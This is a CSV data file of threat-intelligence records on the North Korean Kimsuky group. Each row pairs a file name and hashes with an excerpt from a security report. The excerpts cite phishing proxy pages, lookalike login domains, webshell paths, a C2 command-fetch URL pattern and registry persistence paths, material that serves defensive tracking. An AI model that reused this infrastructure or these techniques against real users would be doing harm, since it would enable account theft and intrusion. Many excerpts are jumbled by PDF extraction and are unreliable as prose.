1.0.0,actor--kimsuky,artifact--sha256:ed42047e1d5a14bdc9ae7371783a86a319a9913ac6f8b92a60745ef9d802c678,observation--sha256:7ae9ce65ffc7d2d7d085fed28eb5c7576eb2fd3e2b24666801d904475f521271,file-name,homeland.docx,homeland.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e856d1f4e726020bc978c074544f066b785412a6ae1f5305a127d6da0e291206,observation--sha256:6a17502c38ac19666835ae3d26f77bbfa2aa71369bf8eda18cdb5ee923b192d3,file-name,host.exe,host.exe,candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1d803d2c278274f583e4ff2ecf1735c1381f35a32e0cf38728e8ffbf4bdcb8cf,observation--sha256:66368aafaa85315b2ae11e3fb497fffeb12e247ddef4bf94b03cdd3a8236cf18,file-name,iepv.exe,iepv.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:671745e8a4092868d418ddfc9a535b81d041c2abe013ad1f60b1c9f99827d059,observation--sha256:ba29767743d58550ceb7713776488d3b0e910a6c9deb851a7b98414d682760fa,file-name,implications.pdf,implications.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 46}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"cuser.log 'accounts.kakao.com' => 46 Mail)****jIyMi5jb20=&rtnurl=(encoded in BASE64, normal URL)aHR0cHM6Ly9tYWlsLm5hdmVyLmNvbQ==&mode=n Operation Covert Stalker Report 'track.tiara.daum.net' => 'track_tiara_daummt.certuser.info', 'office.com' => 'certuser.info' 'aadcdn.msauth.net' => 'aadcdnmsauthdose.certuser.info', (Table 20) File analysis results obtained from certuser.info kakao The normal URL you access is saved, which is used to avoid suspicion of hacking targets by encouraging access to t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:671745e8a4092868d418ddfc9a535b81d041c2abe013ad1f60b1c9f99827d059,observation--sha256:e884a486e71c2c5d70857cde69bc76856852cb40452fdb170ba91c908c9b4151,file-name,implications.pdf,implications.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"nidlog.navernail.e staticnidlog.navernail. er.info (Table 21) Malicious URL mapped to this host IP navermail.info Operation Covert Stalker Report kr accountsmt.certus nidnaver.cnnail.info r.info cemember.info loginssig.servicem fo 48 certuser.info rcaptchanid.nae stat_tiarakk.cert In the Kakao case, the QR code login method was also abused as shown below (Figure 33). When you log in to the phishing URL, index.php (proxy page) saves the access log in a file with the IP of the hacking target, and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:344882c412da545a8876b8c41eb15e27a945d745ec1f5d348e64420782de86f1,observation--sha256:6df92d6df43a82ac80139f196b8ba8c4538f2694732528d8d00ce9826ed29052,file-name,index(2).php,index(2).php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:c510ccf3eded4816c5fdbc12564efba6916330fa47f07e2f59437decad7b8fd5,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:07eaeb655dd167ed90176d715fa89d6b4e52596d1245d313c3dfbab1c8aa84dc,file-name,(index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Although we did not secure the original email related to the phishing in the above (Figure 23), considering the past actions of the Kimsuky organization, when sending a phishing email, it would have included a link to a large attachment or a link in the email body, and when the user clicks on the link, the index. You will access the Yahoo login page through php (proxy page). hxxp://www.namastte.kr/yahoo/index.php?menu=Y2ltb*****==&q=hxxps://login.yahoo.com/?.src=ym&pspi d=2023538075&activity=yba",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:ec33fcaee383e79f4694b1c20c01606585abcdbfa0d25677836693bd19480acc,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"[+] (Ministry of Unification) North Korea Information Portal: ua.zip hxxps://nkinfo.unikorea.go.kr/nkp/term/skNkItTerm.do?pageIndex=32 (Table 15) At the time of recognizing the purpose of the Cook folder, namastte, only show.php existed, so it was difficult to determine the exact upload method or its relationship with other files, but it was confirmed in the analysis of other cases. Malware that uses show.php is shown below (Figure 26). I found a North Korean expression in the comments of index.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:5953ac929fd6003b14fbfccefb2e5957d9849a435ca8ed837d4922dba9530296,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"'www.daum.net' => 'wwwma.certuser.info', It was analyzed and summarized below (Table 20). 'logins.daum.net' => 'loginsma.certuser.info', 'aadcdn.msauth.net' => 'aadcdnmsauthmicrosoftharvard.certuser.info', page 'live.com' => 'certuser.info', *****@hks.havard.edu hacking target At the time of recognizing this Case Study, C2 had four folders, including daum, harvard, kakao, and outlook, and each folder contained a phishing site. 'outlook.office365.com' => 'mailmicrosoftharvard.certuser.info', ÿ Se",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:062f76b113b0067a466f80e4dccb4f2334b7f4ce7419cb4d33704569ec7f9596,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"nidlog.navernail.e staticnidlog.navernail. er.info (Table 21) Malicious URL mapped to this host IP navermail.info Operation Covert Stalker Report kr accountsmt.certus nidnaver.cnnail.info r.info cemember.info loginssig.servicem fo 48 certuser.info rcaptchanid.nae stat_tiarakk.cert In the Kakao case, the QR code login method was also abused as shown below (Figure 33). When you log in to the phishing URL, index.php (proxy page) saves the access log in a file with the IP of the hacking target, and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:9905867610ebf7d1d7d0735ffa5e867c7fd55ec83a72ae2d6d112e2b9a90b7c8,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 57}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ After BASE64 decoding: regularmanager296@gmail.com dji)(#(partially deleted) 57 The Kimsuky organization confirmed that it had accessed not only Daum mail accounts but also Gmail accounts. When using TeamViewer for the first time, an email authentication process was performed, and Kimsuky's organization determined that Google Mail was used to receive authentication information. ÿ Existence of the North Korean expression “face-to-face department” The North Korean expression “face-to-face depart",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:f729e32874b7a5c837323ef10d015f43893c0897573335fa024274403af2f441,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 63}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 27) **** Case of phishing for the purpose of hacking a specific person working at a university. North Korean expressions were also present in the index.php (proxy page) of Naver phishing in “(Table 26) C2 structural analysis and hacking target information” . In Korea, according to the Korean language norms of the National Institute of the Korean Language, convert is written as “convert,” but in North Korea, bait file I decided. URL Second, in Table 27 below, the bait file (recommendation.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:caacdbfa20d587e5aefef509b3ce0ba8f885059ca9079157f26778ca8d1c9de2,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 64}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://kornorms.korean.go.kr/example/exampleList.do?regltn_code=0003 No ÿ May 2023, 183.111.100.193 (KR) In May 2023, AhnLab disclosed analysis information titled “Phishing attack targeting North Korean workers by Kimsuky Group” on the ASEC blog, and in this case, the target of hacking was *****. As a result of searching for a specific person working at a research institute, there was a history of appearing on broadcasts and giving interviews related to North Korea. Although this person is diff",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:b362f81a42e8a8e0955e7c1780274147a519920b9b5d1cdd83ffed7e9ec44435,file-name,index.php,index.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:17ebaf270d6867aa4a465a550d899964de027781f5d48b81fe44b930ae511fea,file-name,index.php,index.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:c516db9e3fbbc97d5dcbcf548ffe0fa02cca5a91bb91ec01572f2924b0f69b25,file-name,(index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--24447f44f83f408c,kimsuky/2024-05-28-kimsuky-webshell.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"페이지 5 / 9 하우리 악성코드 상세 분석 보고서 (5) 피싱 서버는 네이버와 HTTP 통신을 기록을 “/네이버 ID/네이버 ID.txt” 로그 파일에 기록하고 있다. [그림 5] 네이버 통신 로그 (6) 만약 올바른 계정 정보를 입력할 경우 피싱 서버에서 네이버에 로그인 후 네이버 계정 접속에 필요한 Cookie 들을 “/네이버 ID/네이버 ID_Cookie.log.txt” 파일에 저장한다. ※ 수집되는 Cookie : NID_SES, NID_AUT, NID_JKL, NID_SAUTO [그림 6] Cookie 를 수집하는 피싱 페이지 코드(index.php)",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:8c2c4959bc595eb402cbdc3e00dfa2075363efa321deefc7f4874a4954008f37,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 int i4 = i - 16; byte[] bArr2 = new byte[i4]; byte[] bArr3 = new byte[16]; System.arraycopy(bArr, 0, bArr3, 0, 16); int i5 = 0; byte b2 = 0; while (i2 < i4) { if (i5 >= 16) { i5 -= 16; } int i6 = i2 + 16; byte b3 = bArr[i6]; bArr2[i2] = (byte) (b2 ^ (bArr[i6] ^ bArr3[i5])); i2++; i5++; b2 = b3; } return new String(bArr2, StandardCharsets.UTF_8); } catch (Exception unused) { return """"; } } 对相关参数进行解密，得到伪装成 KISA（韩国互联网安全局）应用的相关信息。  KISA_FOREGROUND_SERVI",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:9788fdd66c867a4815f4d06fdd6153f1a728f39300565cd3d8f434c58d2037cd,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[18]. 调用函数 c.c.a.c 之后在函数 c.c.a.e.c 中会拼接请求 URL 用于获取命令，拼接 URL 结果为 http://app.at -me.ml/index.php?m=b&p1=""android_id"" &p2=c，并创建 cmd.dat 文件用于存储命令，该 域名同样被解析到服务器 104.128.239.70。 图[19]. 拼接 URL 获取命令 最后调用函数 c.c.a.g.a ，用于执行服务端返回的命令（1，2，3，4，5，6，7，8）。",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:35fe53e52418f44ec22ba91c5b3ea3e16a676b4fb44cf0d30b1a8aa0fec74196,observation--sha256:d9c41aee298b896d2098b7736b5dc6923d33f054de7f6c33447278b9110072cf,file-name,index1.php,index1.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:35fe53e52418f44ec22ba91c5b3ea3e16a676b4fb44cf0d30b1a8aa0fec74196,observation--sha256:daf029e1034e94840c708898f55eef4426e6fad6ac4f5bcb519bdc3daaa093d0,file-name,index1.php,index1.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d3ef5260f7f734d8a8b5cceeadaf1b1c87e8089255aa1e329db37c8b23ff567c,observation--sha256:a225f05b17dd4e6c91f3fed307994b8ade90a75d28b5a539e0df15ff364906be,file-name,index_.php,index_.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d3ef5260f7f734d8a8b5cceeadaf1b1c87e8089255aa1e329db37c8b23ff567c,observation--sha256:5ec64f27b7931dbf995f6ec5d0f7733ab73012e1394ac6b9fff11469d79b6cfd,file-name,index_.php,index_.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7e914c334d1c6c0695f0281f2cdae67548a9a8c8725704374527e74e9bf63d31,observation--sha256:7b0a8a5c579ab7d942259998bcf64cec99f8d206c88aec69c033afba4f7f2630,file-name,ins_secure.chmMessage.chm,ins_secure.chmMessage.chm,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:9492305fe0868920d4fc4c9518a051d9bc25ecfd4e777136367cc630fdfbaa31,observation--sha256:045130c90571c0c90514bb5f188a2e2cd7519d8a67148490f99ec38a0b61b8cb,file-name,insert_link.php,insert_link.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ www.bluemotion.co.kr/cheditor4/insert_link.php ÿ www.scabm.co.kr/gnuboard4/bbs/view_coma.php ÿ kakaoreug.info/tygygvftsfx8g68Gu8x7s78gsvseidj6.php ÿ bstill.kr/gnuboard4/bbs/view_coma.php 12 ÿ afgvillage.eu/tygygvftsfx8g68Gu8x7s78gsx6.php ÿ listmember.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ kakaocore.eu/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ www.mykoces.com/gnuboard4/bbs/view_coma.php ÿ e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9492305fe0868920d4fc4c9518a051d9bc25ecfd4e777136367cc630fdfbaa31,observation--sha256:cde22c281bc92345713a305477e882f625ae7abb5a10f7fa9da5fd5bc82cff79,file-name,insert_link.php,insert_link.php,candidate,2023-03-22T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 54}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,27.255.80.170(KR) 6 GuestUser 2023-03-22 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsxueidj6.php 09:09:55 Operation Covert Stalker Report 2023-04-11 54 hxxp://www.bluemotion.co.kr/cheditor 4/ insert_link.php 27.255.75.137(KR) hxxps://usesignal.info/tygygvftsfx8g68 Gu8x7s78gsx6.php 10 16:44:22 74.119.239.234(US) 27.255.80.170(KR) 5 222.102.7.13(KR) 12 74.119.239.234(US) GuestUser hxxps://extparts.info/tygygvftsfx8g68G u8x7s78gsx6.php 16:43:53 2023-04-01 9 09:12:21 27.255.75.137(KR) 2023-04-,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9492305fe0868920d4fc4c9518a051d9bc25ecfd4e777136367cc630fdfbaa31,observation--sha256:fa0a0f9dfa9dfffad1d9bbde425be2055ef10581dabcf32c0927a5f71606825e,file-name,insert_link.php,insert_link.php,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9492305fe0868920d4fc4c9518a051d9bc25ecfd4e777136367cc630fdfbaa31,observation--sha256:96f9edb8d9df9f966b3cf9086ce3434c6a69f8650b3bf0e95ec642c2ec005b65,file-name,insert_link.php,insert_link.php,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
